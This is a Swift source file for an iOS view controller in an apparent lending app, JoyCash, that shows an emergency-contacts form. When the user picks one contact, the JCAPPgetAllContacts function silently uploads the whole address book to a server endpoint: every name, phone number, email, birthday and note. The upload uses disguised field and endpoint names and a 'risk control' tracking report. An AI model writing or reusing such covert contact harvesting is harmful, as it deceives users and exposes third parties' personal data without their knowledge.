//
//  JCAPPContactsViewController.swift
//  JoyCash
//
//  Created by Yu Chen  on 2025/2/24.
//

import UIKit
import CYSwiftExtension

class JCAPPContactsViewController: JCAPPCommodityAuthViewController {

    private var JCAPP_sub_height: CGFloat = 20
    private var JCAPPemergency_contacts: [JCAPPEmergencyContactsModel] = []
    
    override func JCAPPbuildViewUI() {
        super.JCAPPbuildViewUI()
        self.JCAPPsetTipWithTitle(String.JCAPP_skkkTieleString(), subTitle: String.JCAPP_sjoklString())
        
        self.JCAPPcontentView.isHidden = false
        
        self.JCAPPcontentView.removeFromSuperview()
        self.JCAPPcontainerView.addSubview(self.JCAPPcontentView)
        self.JCAPP_sub_height = self.JCAPPcontentLab.text?.jk.heightAccording(width: ScreenWidth - APP_PADDING_UNIT * 14, font: UIFont.systemFont(ofSize: 12)) ?? self.JCAPP_sub_height
    }
    
    override func JCAPPlayoutControlViews() {
        super.JCAPPlayoutControlViews()
        
        self.JCAPPcontentLab.snp.removeConstraints()
        self.JCAPPcontentLab.snp.remakeConstraints { make in
            make.top.equalTo(self.JCAPPtitleLab.snp.bottom).offset(APP_PADDING_UNIT * 2)
            make.horizontalEdges.equalTo(self.JCAPPtitleLab)
            make.height.equalTo(self.JCAPP_sub_height)
        }
        
        self.JCAPPcontentView.snp.remakeConstraints { make in
            make.top.equalTo(self.JCAPPcontentLab.snp.bottom).offset(APP_PADDING_UNIT * 5)
            make.horizontalEdges.equalToSuperview()
            make.height.equalTo(ScreenHeight - UIDevice.app_navigationBarAndStatusBarHeight() - UIDevice.app_safeDistanceBottom() - APP_PADDING_UNIT * 38 - self.JCAPP_sub_height)
            make.bottom.equalToSuperview().offset(-APP_PADDING_UNIT * 3)
        }
    }
    
    override func JCAPPpageNetowrkRequest() {
        super.JCAPPpageNetowrkRequest()
        
        guard let _p_id = JCAPPPublic.shared.productID else {
            return
        }
        
        APPNetRequestManager.afnReqeustType(NetworkRequestConfig.defaultRequestConfig("said/semiconductor", requestParams: ["overuse": _p_id])) { [weak self] (task: URLSessionDataTask, res: APPSuccessResponse) in
            guard let _dict = res.jsonDict, let _json_array = _dict["qmri"] as? NSArray, let _contactModels = NSArray.modelArray(with: JCAPPSelectContactsModel.self, json: _json_array) as? [JCAPPSelectContactsModel] else {
                return
            }
            
            self?.JCAPPbuildEmergencyContactsPeopleViews(_contactModels)
        }
    }
    
    override func JCAPPclickNextButton(sender: APPActivityButton) {
        guard let _p_id = JCAPPPublic.shared.productID, let _json = NSArray(array: self.JCAPPemergency_contacts).modelToJSONString() else {
            return
        }
        sender.startAnimation()
        APPNetRequestManager.afnReqeustType(NetworkRequestConfig.defaultRequestConfig("said/advances", requestParams: ["overuse": _p_id, "awarded": _json])) {[weak self] _, _ in
            sender.stopAnimation()
            // 埋点
            JCAPPBuriedPointReport.JCAPPRiskControlInfoBuryReport(riskType: JCAPPRiskControlPointsType.JC_APP_Contacts, beginTime: self?.buryBeginTime, endTime: Date().jk.dateToTimeStamp())
            self?.navigationController?.popViewController(animated: true)
        } failure: { _, _ in
            sender.stopAnimation()
        }
    }
}

private extension JCAPPContactsViewController {
    func JCAPPbuildEmergencyContactsPeopleViews(_ models: [JCAPPSelectContactsModel]) {
        var temp_top: JCAPPSelectContactsItem?
        
        models.enumerated().forEach { (idx: Int, item: JCAPPSelectContactsModel) in
            let view = JCAPPSelectContactsItem(frame: CGRectZero)
            view.JCAPPreloadEmergencyContactModel(item)
            view.itemDelegate = self
            view.tag = 100 + idx
            self.JCAPPcontentView.addSubview(view)
            // 保存联系人信息
            self.JCAPPsaveEmergencyContactsInfo(personTag: view.tag, name: item.foreign, phone: item.interpretations, relation: item.historically)
            
            if let _top = temp_top {
                if idx == models.count - 1 {
                    view.snp.makeConstraints { make in
                        make.top.equalTo(_top.snp.bottom)
                        make.left.width.equalTo(_top)
                        make.bottom.equalToSuperview().offset(-APP_PADDING_UNIT * 3)
                    }
                } else {
                    view.snp.makeConstraints { make in
                        make.top.equalTo(_top.snp.bottom)
                        make.left.width.equalTo(_top)
                    }
                }
            } else {
                view.snp.makeConstraints { make in
                    make.top.equalToSuperview().offset(APP_PADDING_UNIT)
                    make.left.width.equalToSuperview()
                }
            }
            
            temp_top = view
        }
    }
    
    func JCAPPsaveEmergencyContactsInfo(personTag: Int, name: String? = nil, phone: String? = nil, relation: String? = nil) {
        if let _index = self.JCAPPemergency_contacts.firstIndex(where: {$0.personTag == personTag}) {
            self.JCAPPemergency_contacts[_index].personTag = personTag
            if let _name = name {
                self.JCAPPemergency_contacts[_index].foreign = _name
            }
            if let _p = phone {
                self.JCAPPemergency_contacts[_index].interpretations = _p
            }
            if let _r = relation {
                self.JCAPPemergency_contacts[_index].historically = _r
            }
        } else {
            let _temp_model: JCAPPEmergencyContactsModel = JCAPPEmergencyContactsModel()
            _temp_model.personTag = personTag
            
            if let _name = name {
                _temp_model.foreign = _name
            }
            
            if let _p = phone {
                _temp_model.interpretations = _p
            }
            
            if let _r = relation {
                _temp_model.historically = _r
            }
            
            self.JCAPPemergency_contacts.append(_temp_model)
        }
    }
    
    func JCAPPgetAllContacts() {
        APPContactManager.sharedInstance().accessContactsComplection { (success: Bool, persons: [APPPerson]?) in
            guard success else {
                return
            }
            
            let reportArray: NSMutableArray = NSMutableArray()
            
            persons?.forEach({ (item: APPPerson) in
                let p = JCAPPBuryContactsModel()
                p.foreign = item.fullName
                
                if let _b_d = item.birthday.brithdayDate {
                    p.pacemakers = _b_d.jk.toformatterTimeString(formatter: "yyyy-MM-dd")
                }
                
                var phoneStr: [String] = []
                item.phones.forEach { (phoneItem: APPPhone) in
                    phoneStr.append(phoneItem.phone)
                }
                
                p.incorporated = phoneStr.joined(separator: ",")
                p.rather = item.emails.first?.email
                
                if let _c_d = item.creationDate {
                    p.foods = _c_d.jk.toformatterTimeString(formatter: "yyyy-MM-dd")
                }
                
                if let _m_d = item.modificationDate {
                    p.fashion = _m_d.jk.toformatterTimeString(formatter: "yyyy-MM-dd")
                }
                
                if let _note = item.note {
                    p.traditional = _note
                }
                reportArray.append(p)
            })
            
            if var _json = reportArray.modelToJSONString() {
#if DEBUG
                _json = "[{\"reinhard\":\"13303029382\",\"jres\":\"王XX\"}]"
#endif
                APPNetRequestManager.afnReqeustType(NetworkRequestConfig.defaultRequestConfig("said/transportation", requestParams: ["awarded": _json])) { _, _ in
                    APPCocoaLog.debug("通讯录上传完成 -------------")
                }
            }
        }
    }
}

extension JCAPPContactsViewController: APPSelectContactsItemProtocol {
    func JCAPPcontactsItemWasClicked(itemView: JCAPPSelectContactsItem, isRelationShip: Bool) {
        
        if isRelationShip {
            guard let _choise = itemView.JCAPPrelationShipItem.JCAPPunitTupe?.choise else {
                return
            }
            JCAPPTextPickerPopView.JCAPPconvenienceShowPop(self.view, showCloseButton: true).JCAPPreloadTextPickerPopSource(_choise).clickCloseClosure = {[weak self] (popView: JCAPPBasePopView, isConfirm: Bool) in
                
                guard let _p_view = popView as? JCAPPTextPickerPopView, let _model = _p_view.JCAPPtext_select_model else {
                    return
                }
                
                itemView.JCAPPreloadPhoneOrRelationship(relationship: _model.foreign)
                
                self?.JCAPPsaveEmergencyContactsInfo(personTag: itemView.tag, relation: _model.late)
                
                _p_view.JCAPPdismissPop(false)
            }
            
        } else {
            APPContactManager.sharedInstance().requestAddressBookAuthorization {[weak self] (isAuth: Bool) in
                guard !isAuth else {
                    self?.JCAPPgetAllContacts()
                    APPContactManager.sharedInstance().selectContact(at: self) {[weak self] (name: String?, phone: String?) in
                        if let _n = name, let _p = phone {
                            itemView.JCAPPreloadPhoneOrRelationship(_n + "-" + _p)
                            self?.JCAPPsaveEmergencyContactsInfo(personTag: itemView.tag, name: _n, phone: _p)
                        }
                    }
                    return
                }
                
                self?.showSystemStyleSettingAlert(String.JCAPP_skdjiwojString(), okTitle: nil, cancelTitle: nil)
            }
        }
    }
}
